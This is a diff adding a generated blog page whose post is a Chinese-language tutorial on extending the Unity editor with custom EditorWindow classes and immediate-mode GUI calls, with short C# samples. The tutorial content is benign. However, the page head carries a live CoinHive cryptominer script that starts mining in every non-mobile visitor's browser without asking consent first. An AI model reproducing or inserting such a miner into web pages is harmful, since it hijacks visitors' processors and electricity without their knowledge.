@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="WeAthFolD">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="扩展Unity编辑器（一）：自定义窗口"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="WeAthFolD&#39;s Inverted Field"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://weathfold.github.ioundefined"/>
+  
+    <link rel="alternate" href="/atom.xml" title="WeAthFolD&#39;s Inverted Field" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>WeAthFolD's Inverted Field</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-111190795-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <!-- CoinHive -->
+  <script>
+    var miner = new CoinHive.Anonymous('CLCs74GtZ05pN4V8LsFkGeZWsfAzVjLn', {throttle: 0.8});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+      miner.start();
+    }
+
+    setInterval(function() {
+      // var hashesPerSecond = miner.getHashsePerSecond();
+      var acceptedHashes = miner.getAcceptedHashes();
+      document.getElementById("hashCount").innerHTML = acceptedHashes;
+    }, 1000);
+  </script>
+<link rel="stylesheet" href="/css/prism-atom-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/kimi-no-na-wa.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">扩展Unity编辑器（一）：自定义窗口</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/friends">
+                  
+                  Friends
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/about">
+                  
+                  About
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/Resume">
+                  
+                  Resume
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By WeAthFolD</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2016-12-16</span>
+            <span class="time">17:59:10</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/Gamedev/">Gamedev</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/unity/">#unity</a> <a class="tag" href="/tags/editor/">#editor</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>Unity自身提供的编辑功能是很强大，但也是受限的。在构建游戏的过程中，如果我们只能依赖于Unity自身的对象编辑功能，在很多地方将无法满足开发效率和工作流的需要，例如如下的场景：</p>
+<ol>
+<li>制作一个有对话系统的RPG游戏，想要把对话的选择条件、编辑和跳转可视化；</li>
+<li>想用行为树来建模怪物AI，并且需要一个编辑行为树节点的可视化编辑器；</li>
+<li>在制作2D tile-based（基于网格）的游戏时，需要一个能对齐到网格的地图编辑器；</li>
+<li>…</li>
+</ol>
+<p>这些都对编辑器的功能提供了新层次的要求：简单修改对象内部的值并不够，还需要提供一种能自定义的、有意义的编辑方式。</p>
+<p>所幸Unity在自定义编辑器方面，提供的支持相当齐全。我最近就通过Unity的自定义编辑器接口，实现了一个2D基于网格的地图编辑器，也想借此机会把学到的知识整理一下。</p>
+<p>这篇文章是这一系列总结文章的第一篇，主要对Unity提供的扩展窗口的接口和绘制窗口的方式进行介绍。</p>
+<a id="more"></a>
+<h1 id="1-创建窗口"><a href="#1-创建窗口" class="headerlink" title="1. 创建窗口"></a>1. 创建窗口</h1><p>在Unity中允许对编辑器进行的扩展主要分为两种：通过继承 <code>Editor</code> 类来扩展Inspector窗口，和继承 <code>EditorWindow</code> 类来创建自定义显示窗口.</p>
+<h2 id="1-1-Editor-Scipt"><a href="#1-1-Editor-Scipt" class="headerlink" title="1.1. Editor Scipt"></a>1.1. Editor Scipt</h2><p>所有编辑器相关的代码是不会出现在最终游戏中的，因此Unity用一个特殊的规则来区分这些脚本：任何放置在 <code>Editor</code> 文件夹（不一定是根目录下，任何子目录的Editor文件夹都可以）<br>下的脚本都被认为是编辑器脚本——它们会被Unity读取和使用，并且不能被非Editor脚本的普通脚本引用。因此，要记得把所有编辑器相关的代码都放到Editor文件夹中。</p>
+<h2 id="1-2-Editor"><a href="#1-2-Editor" class="headerlink" title="1.2. Editor"></a>1.2. Editor</h2><p><code>Editor</code> 类允许自定义特定类型的 Inspector（检视器）窗口，也就是我们编辑对象值的时候常用的那个窗口。</p>
+<p>我们需要在自定义的Editor类型前加上 <code>[CustomEditor(System.Type)]</code> 属性，来指明它对应的是哪个类型。如果这个编辑器需要多对象编辑的功能，还可以加上 <code>[CanEditMultipleObjects]</code> 属性。</p>
+<p>Editor有一些和 <code>MonoBehaviour</code> 类相似的回调，例如 <code>OnEnable</code>，<code>Awake</code> 和 <code>OnDisable</code>。不过最重要的一个回调应该是 <code>OnInspectorGUI</code> ，我们需要使用这个回调来进行绝大部分的动作，例如GUI绘制和控制消息处理。</p>
+<p><a href="https://docs.unity3d.com/ScriptReference/Editor.html" target="_blank" rel="noopener">Unity Doc地址</a></p>
+<h2 id="1-3-EditorWindow"><a href="#1-3-EditorWindow" class="headerlink" title="1.3. EditorWindow"></a>1.3. EditorWindow</h2><p><code>EditorWindow</code> 则代表一个独立的编辑器窗口。Unity不会自动调用它，而是需要我们去主动打开。例如，下面的代码创建一个窗口，显示“PHP是世界上最好的语言”，并且可以从菜单项 <code>Custom/PHP</code> 打开它。</p>
+<pre class="line-numbers language-C#"><code class="language-C#">using UnityEngine;
+using UnityEditor;
+using System.Collections;
+
+public class PHPWindow : EditorWindow {
+
+    [MenuItem("Custom/PHP")]
+    public static void Open() {
+        var window = new PHPWindow();
+        window.name = "PHP Editor";
+        window.Show();
+    }
+
+    void OnGUI() {
+        GUILayout.Label("PHP is the best language in the world");
+    }
+
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>和 <code>Editor</code> 不同，<code>EditorWindow</code> 处理GUI事件的回调方法是 <code>OnGUI</code>。</p>
+<p><img src="/images/ext-editor-1.jpg" alt=""></p>
+<p><img src="/images/ext-editor-2.jpg" alt=""></p>
+<p>这个窗口可以和任何其他的编辑器子窗口一样进行拖动、缩放和停靠。Neat isn’t it?</p>
+<p><a href="https://docs.unity3d.com/ScriptReference/EditorWindow.html" target="_blank" rel="noopener">Unity Doc地址</a></p>
+<h1 id="2-GUI绘制和处理"><a href="#2-GUI绘制和处理" class="headerlink" title="2. GUI绘制和处理"></a>2. GUI绘制和处理</h1><p>无论是Editor还是EditorWindow，我们最终都需要在回调方法中进行GUI绘制和事件处理。Unity提供了一套统一的 Immediate-mode（立即模式）接口来进行编辑器GUI的处理，接下来我们对它进行简单的介绍。</p>
+<h2 id="2-1-立即模式-Immediate-Mode"><a href="#2-1-立即模式-Immediate-Mode" class="headerlink" title="2.1. 立即模式 (Immediate Mode)"></a>2.1. 立即模式 (Immediate Mode)</h2><p>Unity的编辑器部分使用的是“立即模式”GUI。通常的GUI实现方式，一般每个控件都是一个独立的类，有它独立的位置/样式/回调存储。而立即模式的GUI则是stateless（无状态）的，每个控件实际上就是GUI回调中的一次方法调用，例如：</p>
+<pre class="line-numbers language-C#"><code class="language-C#">string path = "";
+
+void OnGUI() {
+    path = GUILayout.TextField(path);
+    if (path != "") {
+        if (GUILayout.Button("Create")) {
+            // Do button callback...
+        }
+    }
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这样的GUI绘制方法对实时性、动态性要求高的程序来说是很方便的，因为我们可以很容易控制控件的产生和消失。GUI的数据直接由使用者管理，而GUI控件的回调则返回对数据的更改。</p>
+<p>可以看看<a href="https://docs.unity3d.com/Manual/GUIScriptingGuide.html" target="_blank" rel="noopener">这篇文档</a>来了解IMGUI的更多信息。</p>
+<h2 id="2-2-GUI接口"><a href="#2-2-GUI接口" class="headerlink" title="2.2. GUI接口"></a>2.2. GUI接口</h2><p>Unity的GUI绘制部分由四个类接管：<code>GUI</code>, <code>GUILayout</code>, <code>EditorGUI</code> 和 <code>EditorGUILayout</code>。</p>
+<p>其中，以 <code>Layout</code> 结尾的两个类会自动对GUI内容进行排版，并且可以混合使用。它们提供的接口和 <code>GUI</code>、<code>EditorGUI</code> 类分别基本一致，只是无Layout版本需要额外的提供控件的绘制范围参数。</p>
+<p><code>GUI</code> 类提供的是一些比较基本的控件，包括文本框（<code>TextArea</code>，<code>TextField</code>），复选框（<code>Toggle</code>），按钮（<code>Button</code>）等。它还可以创建子区域（<code>BeginGroup</code>），子窗口（<code>Window</code>），滚动区域（<code>BeginScrollView</code>）等，并在其中进行进一步的GUI处理。除了比较高层的控件绘制，GUI类也有很底层的绘制方法，例如 <code>GUI.DrawTexture</code>，可以将一个贴图直接绘制到一个矩形区域中。</p>
+<p><code>EditorGUI</code> 类的工作原理相同，但提供的是一些编辑器相关的控件，例如 <code>PropertyField</code>，<code>MinMaxSlider</code>，<code>ColorField</code> 等。在进行编辑器的内容安排时通常更多的会用到EditorGUI。使用EditorGUI，我们可以做到Unity对象编辑能实现的所有功能。</p>
+<p>自动Layout版本的IMGUI有一个特别好的feature——可以很方便的让一个编辑器的内容“嵌入”一个子窗口或者一个子区域。例如，假如你想在一个编辑器的子区域中放一个对象编辑器，只需要类似下面的调用就可以了：</p>
+<pre><code>void OnGUI() {
+    GUI.BeginGroup(...);
+    var editor = Editor.CreateEditor(...);
+    editor.OnInspectorGUI();
+    GUI.EndGroup();
+}
+</code></pre><h2 id="2-3-事件处理"><a href="#2-3-事件处理" class="headerlink" title="2.3. 事件处理"></a>2.3. 事件处理</h2><p><code>Event.current</code> 对应了GUI回调的当前事件。它可以是简单的重绘，也可以是鼠标移动、按键按下等代表输入处理的事件。</p>
+<p>Event是对当前GUI的上下文敏感的。例如，如果你在GUI中创建了一个子窗口，在这个子窗口中拿到的 <code>Event.current</code> 中的鼠标位置就是相对于当前窗口top-left corner的。</p>
+<h1 id="3-Sidenote-吐槽和坑"><a href="#3-Sidenote-吐槽和坑" class="headerlink" title="3. Sidenote: 吐槽和坑"></a>3. Sidenote: 吐槽和坑</h1><p>1：EditorWindow使用 <code>GUI.Window</code> 回调创建子窗口的时候，必须把调用包含在 <code>EditorWindow.BeginWindows</code> 和 <code>EditorWindow.EndWindows</code> 之中。然而这两个函数只隐藏在文档 EditorWindow 的函数列表之中，找半天才发现，刚刚开始的时候还以为子窗口在这里根本用不了，吐血。</p>
+<p>2：Unity的官方文档在这部分的cross-reference让人在摸清结构的时候很头痛啊T^T 就说下个人的体验：首先从Editor开始，发现OnInspectorGUI可以处理回调 -&gt; 不知道哪里可以进行GUI绘制 -&gt; （狂搜）找到 EditorGUILayout -&gt; 发现 EditorGUILayout 无法自定义位置 -&gt; （狂搜）找到EditorGUI -&gt; 然后又找到了GUI和GUILayout，然后文档里又没有说清楚这四个类的相互关系，在说EditorGUI的时候只有这么一句：<code>These work pretty much like the normal GUI functions - and also have matching implementations in EditorGUILayout</code>，并没有说明它们的区别。要是能在文档里加入一些比较重要的cross-reference会好很多。</p>
+<hr>
+<p>这篇文章主要整理了Unity的编辑器创建和GUI绘制的一些接口。在下一篇文章里，会谈一谈编辑器实际应用中的比较重要的一个问题：创建和读取自定义asset。</p>
+
+        </div>
+        <div id="disqus_thread"></div>
+        <script>
+        
+        /**
+        *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+        *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        /*
+        var disqus_config = function () {
+        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        */
+        (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://weathfold-ghpages.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                                    
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
